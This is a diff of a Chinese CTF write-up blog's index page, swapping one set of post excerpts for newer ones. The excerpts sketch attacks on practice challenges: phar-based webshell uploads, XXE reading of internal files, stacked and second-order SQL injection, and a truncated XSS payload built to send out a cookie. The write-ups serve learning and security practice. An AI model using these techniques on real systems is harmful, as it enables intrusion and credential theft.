@@ -34,7 +34,7 @@
 <meta property="og:description" content="世所谓英雄者，不以挫抑而灰心，不以失败而退怯">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/banner.webp">
-<meta property="article:author" content="fuboy">
+<meta property="article:author" content="FuB0Y">
 <meta property="article:tag" content="博客">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/banner.webp">
@@ -49,6 +49,12 @@
 <link rel="stylesheet" href="/css/style.css">
 
   <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        <link rel="preload" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+      
+    
   
   
   
@@ -197,14 +203,14 @@
     <div class="sidebar-wrap" data-aos="fade-up">
       
         <div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -212,7 +218,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -272,310 +278,31 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/04/05/%5BSWPUCTF%202018%5DSimplePHP/" aria-label="[SWPUCTF 2018]SimplePHP"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[SWPUCTF 2018]SimplePHP" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-04-05</span>
-        <span><span class="icon-pencil"></span>1.8k 字</span>
-        <span><span class="icon-clock"></span>9 分钟</span>
-      </div>
-      <h2 class="post-title">[SWPUCTF 2018]SimplePHP</h2>
-      <article class="post-article">
-        
-          知识点：1234phar://伪协议这个就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意 PHP&amp;gt;=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式无unserialize()的反序列化-&amp;gt;phar
-
-先放张图来唤醒回忆
-
-信息收集上传文件界面：可以提交文件，但又过滤，文件名称upload
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/04/04/%5BHFCTF2020%5DEasyLogin/" aria-label="[HFCTF2020]EasyLogin"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="../images/17373827994914.jpg" data-sizes="auto" alt="[HFCTF2020]EasyLogin" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-04-04</span>
-        <span><span class="icon-pencil"></span>570 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
-      </div>
-      <h2 class="post-title">[HFCTF2020]EasyLogin</h2>
-      <article class="post-article">
-        
-           
-这题我们发现有一个登录和注册页面，我们随便注册一个用户名然后登录
-
-题目分析会发现有一个getflag，但我们点击之后会弹出权限不足
-那应该是要登录admin账户才能拿到了
-我们在信息搜集一下看能不能发现什么东西
-在源代码里发现一个app.js文件
-1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function login() &amp;#123;    const username = $(&amp;quot;#username&amp;quot;).val();    const pas
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/04/02/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%87%E6%BB%A4%E5%99%A8/" aria-label="php:filter的奇淫巧计"></a>
+      <a class="post-link" href="/2025/06/13/CISCN2023-Unzip/" aria-label="CISCN2023-Unzip"></a>
     
     
     <div class="post-cover-left">
       
         
         
-          <img data-src="../images/17369576223624.jpg" data-sizes="auto" alt="php:filter的奇淫巧计" class="lazyload">
+          <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="CISCN2023-Unzip" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-04-02</span>
-        <span><span class="icon-pencil"></span>932 字</span>
-        <span><span class="icon-clock"></span>4 分钟</span>
-      </div>
-      <h2 class="post-title">php:filter的奇淫巧计</h2>
-      <article class="post-article">
-        
-          简介php:&amp;#x2F;&amp;#x2F;fileter的基本格式：
-php://filter/read=?/resource=?
-
-
-
-项目
-描述
-
-
-
-resource
-在 php:&amp;#x2F;&amp;#x2F;filter 中，resource 参数是必须的。resource 用于指定 需要进行筛选过滤的数据流。
-
-
-read
-read 参数指定 一个或多个过滤器 用于 读 操作，多个过滤器之间以管道符进行分隔。
-
-
-write
-write 参数指定 一个或多个过滤器 用于 写 操作，多个过滤器之间以管道符进行分隔。
-
-
-任何没有以 read= 或 write= 作前缀的筛选器列表会 视情况应用于读
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/04/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown/" aria-label="[网鼎杯 2020 白虎组]PicDown"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[网鼎杯 2020 白虎组]PicDown" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-04-02</span>
-        <span><span class="icon-pencil"></span>1.3k 字</span>
-        <span><span class="icon-clock"></span>5 分钟</span>
-      </div>
-      <h2 class="post-title">[网鼎杯 2020 白虎组]PicDown</h2>
-      <article class="post-article">
-        
-          知识点：123456789101112131415161718192021222324python2的urllib的urlopen，和urllib2中的urlopen明显区别就是urllib.urlopen支持将路径作为参数去打开对应的本地路径，所以可以直接填入路径读取文件• proc目录proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。还有的是一些以数字命名的目录，他们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的PID号为目录名，他们是读取进程信息的接口。而self目录则是读取进程本身
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/04/01/%5BHITCON%202017%5DSSRFme/" aria-label="[HITCON 2017]SSRFme"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        
-        
-          <img data-src="../images/1737907114de8a.jpg" data-sizes="auto" alt="[HITCON 2017]SSRFme" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-04-01</span>
-        <span><span class="icon-pencil"></span>809 字</span>
-        <span><span class="icon-clock"></span>3 分钟</span>
-      </div>
-      <h2 class="post-title">[HITCON 2017]SSRFme</h2>
-      <article class="post-article">
-        
-           题目源码：
-12345678910111213141516171819&amp;lt;?php    if (isset($_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;])) &amp;#123;        $http_x_headers = explode(&amp;#x27;,&amp;#x27;, $_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;]);        $_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;] = $http_x_headers[0];    &amp;#125;    echo $_SERVER[&amp;quot;R
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/04/01/%5BNCTF2019%5DTrue%20XML%20cookbook/" aria-label="[NCTF2019]True XML cookbook"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[NCTF2019]True XML cookbook" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-04-01</span>
-        <span><span class="icon-pencil"></span>1.1k 字</span>
-        <span><span class="icon-clock"></span>5 分钟</span>
-      </div>
-      <h2 class="post-title">[NCTF2019]True XML cookbook</h2>
-      <article class="post-article">
-        
-          知识点：1234XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测**内网信息可以查看**/etc/hosts(主机名与 IP 映射)、/proc/net/arp(内网活跃设备)、proc/net/fib_trie(内网子网结构和路由策略)**等等
-
- 这题的界面和ctfshow上xxe最后一题很像
-
-题目界面
-我们抓包查看
-
-我们看到请求包
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/04/01/%5BRCTF2015%5DEasySQL/" aria-label="[RCTF2015]EasySQL"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[RCTF2015]EasySQL" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-04-01</span>
-        <span><span class="icon-pencil"></span>535 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
-      </div>
-      <h2 class="post-title">[RCTF2015]EasySQL</h2>
-      <article class="post-article">
-        
-           用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方
-
-总共就只有这三处可以进行注入
-我们注册admin的账号发现存在用户，那我们尝试使用二次注入来登录admin的账号
-12345678910111213注册admin&amp;quot;密码为1登录admin&amp;quot;密码为1修改密码1-&amp;gt;2重返登录界面登录admin密码为2登录成功
-
-我们成功登录admin的账号，但未发现flag，但起码证明了注册页面存在二次注入
-那我们猜测后端注册页面的sql语句为
-1select * from user where username=&amp;quot;xxx&amp;quot; and passwo
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/31/JWT/" aria-label="JWT"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="JWT" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-31</span>
-        <span><span class="icon-pencil"></span>266 字</span>
+        <span><span class="icon-calendar"></span>2025-06-13</span>
+        <span><span class="icon-pencil"></span>380 字</span>
         <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">JWT</h2>
+      <h2 class="post-title">CISCN2023-Unzip</h2>
       <article class="post-article">
         
-          JSON Web Token是什么
-JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。
-
-JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内容，第三部分是加密的签名部分
-第一部分被称为header,会说明字符串的类型以及加密方式，当然还会包含其他一些字段，在介绍JWT安全问题时会涉及到部分。
-第二部分被称为payload,包含用户的身份id,是否是管理权限等字段，这部分中的相关字段可以根据实际情况自行定义。
-第三部分
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/31/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/" aria-label="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[CISCN2019 华北赛区 Day1 Web2]ikun" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-31</span>
-        <span><span class="icon-pencil"></span>408 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
-      </div>
-      <h2 class="post-title">[CISCN2019 华北赛区 Day1 Web2]ikun</h2>
-      <article class="post-article">
-        
-          知识点：12pickle反序列化jwt构造
-
- ikun的题
-前面的步骤略述一下吧
-需买vp6
-我们用脚本把vp6的购买页面爆出来
-12345678import requestsurl=&amp;quot;http://7de96e39-e3e1-4117-ad12-5b29895ec975.node5.buuoj.cn/shop?page=&amp;quot;for i in range (0,2000):    print(i)    r = requests.get(url + str(i))    if &amp;#x27;lv6.png&amp;#x27; in r.text:        print(i)   
+          
+封面就是典型的文件上传
+我们随便上传一个文件
+结果给了我们上传的源码：
+12345678910&amp;lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo = finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($finfo, $_FILES[&amp;quot;file&amp;quot;][&amp;quot;tmp_name&amp;quot;]) === &amp;#x27;application/zip&amp;#x27;)&amp;#123;    exec(&amp;#x27;cd /tmp &amp;amp;&amp;amp; unzip -o &amp;#x27; 
         
       </article>
     </div>
@@ -585,24 +312,355 @@ JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/31/%5BZer0pts2020%5DCan%20you%20guess%20it/" aria-label="[Zer0pts2020]Can you guess it"></a>
+      <a class="post-link" href="/2025/06/12/%5BNewStarCTF%20%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93%5DmultiSQL/" aria-label="[NewStarCTF 公开赛赛道]multiSQL"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[Zer0pts2020]Can you guess it" class="lazyload">
+        
+        
+          <img data-src="/images/1755142834147175514283467.jpg" data-sizes="auto" alt="[NewStarCTF 公开赛赛道]multiSQL" class="lazyload">
+        
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-31</span>
-        <span><span class="icon-pencil"></span>555 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
+        <span><span class="icon-calendar"></span>2025-06-12</span>
+        <span><span class="icon-pencil"></span>268 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">[Zer0pts2020]Can you guess it</h2>
+      <h2 class="post-title">[NewStarCTF 公开赛赛道]multiSQL</h2>
       <article class="post-article">
         
-          知识点：1234567891011$_SERVER[&amp;#x27;PHP_SELF&amp;#x27;] 包含了当前执行脚本的文件路径/index.php/index.php/aaa.php这两种访问的都是index.php，可能是因为aaa.php不存在basename()可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录$var1=&amp;quot;/config.php/test&amp;quot;basename($var1)	=&amp;gt; test$var2=&amp;quot;/config.php/%ff&amp;quot;basename($var2)	=&amp;gt;	
+          
+界面如上
+点击验证成绩：
+
+根据题目判断这是一个sql注入题
+我们先用万能语句试一下
+
+发现一个可怜小子，离425就差1分
+那这里我们可以大致理清思路：修改火华的分数&amp;gt;=425
+题目提示我们是堆叠注入
+测试了一下，发现select,update,insert和union都被ban了
+输入1&#39;;show tables;#
+
+爆出表为score
+输入1&#39;;show columns from score;#
+
+后面就无法注出来了
+这里有两种方法可以改成绩
+ 法一 replace绕过insert
+replace其实是可以代替insert的
+尝试插入新成绩：
+1’;replace into sc
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/12/NewStarCTF-Crypto%E5%A4%8D%E7%8E%B0/" aria-label="Crypto复现"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/background-2.jpg" data-sizes="auto" alt="Crypto复现" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-12</span>
+        <span><span class="icon-pencil"></span>8.2k 字</span>
+        <span><span class="icon-clock"></span>42 分钟</span>
+      </div>
+      <h2 class="post-title">Crypto复现</h2>
+      <article class="post-article">
+        
+           week1
+ Base (16进制+base解密）
+给了我们一串字符串
+先16进制解密一次
+再base32+base64解密一次
+ Strange King
+123题目描述：某喜欢抽锐刻 5 的皇帝想每天进步一些，直到他娶了个模，回到原点，全部白给😅 这是他最后留下的讯息：`ksjr&amp;#123;EcxvpdErSvcDgdgEzxqjql&amp;#125;`，flag 包裹的是可读的明文
+根据ksjr对应flag可以发现
+f=k-5
+l=s-7
+…
+对应偏移量5,7,9,11
+而且需要%26
+脚本：
+123456789101112a=&amp;quot;ksjr&amp;#123;EcxvpdErSvcDgdg
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/11/%5BD3CTF%202019%5DEzUpload/" aria-label="[D3CTF 2019]EzUpload"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/175637316152817563731618.jpg" data-sizes="auto" alt="[D3CTF 2019]EzUpload" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-11</span>
+        <span><span class="icon-pencil"></span>1.7k 字</span>
+        <span><span class="icon-clock"></span>7 分钟</span>
+      </div>
+      <h2 class="post-title">[D3CTF 2019]EzUpload</h2>
+      <article class="post-article">
+        
+          参考题解：
+2019 D^3 CTF-Web部分复现记录 | Somnus’s blog
+D^3CTF 官方Write Up-安全KER - 安全资讯平台
+[D3CTF 2019]EzUpload gzip压缩phar .htaccess内容正则绕过 glob:&amp;#x2F;&amp;#x2F;**目录 绕过open_basedir - 灰信网（软件开发博客聚合）
+D3CTF2019-ezupload | Antel0p3’s blog
+开题就有源码
+12345678910111213141516171819202122232425262728293031323334353637383940414243
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/10/CTFSHOW%E4%B9%8BRCE%E8%BF%9B%E9%98%B6/" aria-label="CTFSHOW之极限命令执行"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW之极限命令执行" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-10</span>
+        <span><span class="icon-pencil"></span>2.6k 字</span>
+        <span><span class="icon-clock"></span>12 分钟</span>
+      </div>
+      <h2 class="post-title">CTFSHOW之极限命令执行</h2>
+      <article class="post-article">
+        
+          RCE1(自增)12345678910111213141516171819&amp;lt;?php//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。error_reporting(0);highlight_file(__FILE__);if (isset($_POST[&amp;#x27;ctf_show&amp;#x27;])) &amp;#123;    $ctfshow = $_POST[&amp;#x27;ctf_show&amp;#x27;];    if (is_string($ctfshow) &amp;amp;&amp;amp; strlen($ctfshow) &amp;lt;= 105) &amp;#123;  
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/10/%5BJMCTF%202021%5DGoOSS/" aria-label="[JMCTF 2021]GoOSS"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/1737907114de8a.jpg" data-sizes="auto" alt="[JMCTF 2021]GoOSS" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-10</span>
+        <span><span class="icon-pencil"></span>939 字</span>
+        <span><span class="icon-clock"></span>5 分钟</span>
+      </div>
+      <h2 class="post-title">[JMCTF 2021]GoOSS</h2>
+      <article class="post-article">
+        
+           一个go语言的题目
+给了源码附件
+index.php:
+1234&amp;lt;?php// php in localhost port 80readfile($_GET[&amp;#x27;file&amp;#x27;]);?&amp;gt;
+
+main.go
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/09/%5BHMGCTF2022%5DFan%20Website/" aria-label="[HMGCTF2022]Fan Website"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/bg1.jpg" data-sizes="auto" alt="[HMGCTF2022]Fan Website" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-09</span>
+        <span><span class="icon-pencil"></span>1.3k 字</span>
+        <span><span class="icon-clock"></span>7 分钟</span>
+      </div>
+      <h2 class="post-title">[HMGCTF2022]Fan Website</h2>
+      <article class="post-article">
+        
+            开题有提示：
+
+
+进来就是一个什么什么系统
+这种题一般都是代码审计
+&amp;#x2F;www.zip果然有源码泄露
+文件太多了，看不过来，直接丢给工具
+
+这里有个文件读取函数，很可疑
+跟进：&amp;#x2F;module&amp;#x2F;Album&amp;#x2F;src&amp;#x2F;Controller&amp;#x2F;AlbumController.php
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/08/%5BPWNHUB%20%E5%85%AC%E5%BC%80%E8%B5%9B%202018%5D%E5%82%BB%20fufu%20%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%97%A5/" aria-label="[PWNHUB 公开赛 2018]傻 fufu 的工作日"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="[PWNHUB 公开赛 2018]傻 fufu 的工作日" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-08</span>
+        <span><span class="icon-pencil"></span>1k 字</span>
+        <span><span class="icon-clock"></span>5 分钟</span>
+      </div>
+      <h2 class="post-title">[PWNHUB 公开赛 2018]傻 fufu 的工作日</h2>
+      <article class="post-article">
+        
+           开启靶机：
+
+就一个文件上传
+上传之后会重命名
+发现存在/index.php.bak源码泄露
+但下载下来发现是混淆的
+
+phpjiami加密流程1加密流程：源码 -&amp;gt; 加密处理（压缩，替换，BASE64，转义）-&amp;gt; 安全处理（验证文件 MD5 值，限制IP、限域名、限时间、防破解、防命令行调试）-&amp;gt; 加密程序成品，再简单的说：源码 + 加密外壳
+
+直接找解密脚本
+phpjiami，放入kali中
+然后把需要解密的文件放入encode文件夹中
+
+运行php phpjiami.php
+解密结果在decode文件夹中
+
+发现还有个UploadFile.class.php
+访问Up
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/08/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%80%BB%E5%86%B3%E8%B5%9B%5DNovel/" aria-label="[网鼎杯 2020 总决赛]Novel"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="/images/1737907114de8a.jpg" data-sizes="auto" alt="[网鼎杯 2020 总决赛]Novel" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-08</span>
+        <span><span class="icon-pencil"></span>1.3k 字</span>
+        <span><span class="icon-clock"></span>6 分钟</span>
+      </div>
+      <h2 class="post-title">[网鼎杯 2020 总决赛]Novel</h2>
+      <article class="post-article">
+        
+           打开靶机：
+
+是一个文件上传的画面，且仅支持txt格式
+可以进行文件上传和备份
+代码审计有源码附件
+index.php:
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&amp;lt;?phpdefined(&amp;#x27;DS&amp;#x27;) or define(&amp;#x27;DS&amp;#x27;, DIRECTORY_SEPARATOR);define(&amp;#x27;APP_DIR&amp;#x27;, realpa
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/06/07/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84web02%E5%A4%8D%E7%8E%B0/" aria-label="网鼎杯2024青龙组web02复现"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="网鼎杯2024青龙组web02复现" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-06-07</span>
+        <span><span class="icon-pencil"></span>465 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">网鼎杯2024青龙组web02复现</h2>
+      <article class="post-article">
+        
+            referer:渗透测试 | 一次利用XSS读取源码 - FreeBuf网络安全行业门户
+开题进来随意登录得到一个hash
+
+访问
+
+输入框这里是前端源码，很明显可以构造xss
+1&amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;starven hacked you!&amp;#x27;)&amp;lt;/script&amp;gt;
+
+有弹窗
+点击 submit 机器人会访问我们的页面 最简单的方法 考虑 XMLRequest 发起ajax请求实现外带flag
+这里尝试外带一下cookie
+1&amp;lt;script&amp;gt;var xhr = new XMLHttpRequest(); xhr.ope
         
       </article>
     </div>
@@ -613,7 +671,7 @@ JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内
 
   <nav id="page-nav" data-aos="fade-up">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
   </nav>
 
 
@@ -631,7 +689,7 @@ JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内
       <span class="icon-copyright"></span>
       2020-2025
       <span class="footer-info-sep rotate"></span>
-      fuboy
+      FuB0Y
     </div>
     
       <div>
@@ -642,10 +700,10 @@ JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内
     
       <div>
         <span class="icon-brush"></span>
-        115.8k
+        284k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        07:58
+        20:48
       </div>
     
     
@@ -674,14 +732,14 @@ JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内
   <div class="sidebar-wrap">
     
       <div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -689,7 +747,7 @@ JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -841,6 +899,15 @@ JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内
 </script>
 
 
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
